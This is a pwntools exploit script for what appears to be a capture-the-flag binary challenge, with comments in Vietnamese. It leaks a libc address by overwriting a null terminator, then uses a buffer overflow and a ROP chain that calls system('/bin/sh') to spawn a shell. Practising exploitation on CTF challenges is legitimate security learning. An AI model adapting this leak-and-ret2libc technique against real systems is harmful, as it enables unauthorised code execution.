from pwn import *

# Đảm bảo đây là file GỐC lấy từ zip, đã patch libc
exe = './chal' 
elf = context.binary = ELF(exe, checksec=False)
libc = ELF('./libc.so.6', checksec=False)

# context.log_level = 'debug'

def start():
    if args.GDB:
        return gdb.debug(exe, '''
            # Breakpoint sau khi scanf choice để xem null byte bị ghi đè chưa
            b *vuln+132 
            c
        ''')
    else:
        return process(exe)

p = start()

# 1. Login: Lấp đầy buffer
# name: 255 chars + \0 (tại index 255)
# pass: 255 chars + \0
p.sendlineafter(b'information: ', b'A'*255 + b':' + b'B'*255)

# 2. Overwrite Null Byte
# Nhập -1. Nếu layout chuẩn, biến choice nằm đè lên byte \0 của name.
# 0xFFFFFFFF sẽ xóa bay \0.
p.sendlineafter(b'Hello ', b'-1')

# 3. Leak
p.recvuntil(b'Hello ')
leak_data = p.recvline().strip()

if len(leak_data) > 512:
    print(f"[+] Leak success! Len: {len(leak_data)}")
    
    # Lấy leak từ stack sau struct user
    stack_leak = leak_data[512:]
    leak_val = u64(stack_leak[8:16].ljust(8, b'\0'))
    print(f"[+] Raw Leak: {hex(leak_val)}")
    
    # Tinh chỉnh offset này bằng GDB trên file gốc
    # Thường là __libc_start_call_main+128
    libc.address = leak_val - 0x29d90 
    print(f"[+] Libc Base: {hex(libc.address)}")
    
    # 4. Pwn
    p.sendline(b'1') # Chọn option 1 (đổi tên)
    
    rop = ROP(libc)
    rop.raw(rop.find_gadget(['ret']))
    rop.system(next(libc.search(b'/bin/sh')))
    
    # Payload: Name + Pass + Saved RBP + ROP
    payload = b'A'*256 + b'B'*256 + b'C'*8 + rop.chain()
    
    p.sendlineafter(b'New name: ', payload)
    p.interactive()
else:
    print("[-] Vẫn chưa leak được. Hãy chắc chắn bạn đang dùng file CHAL GỐC từ zip.")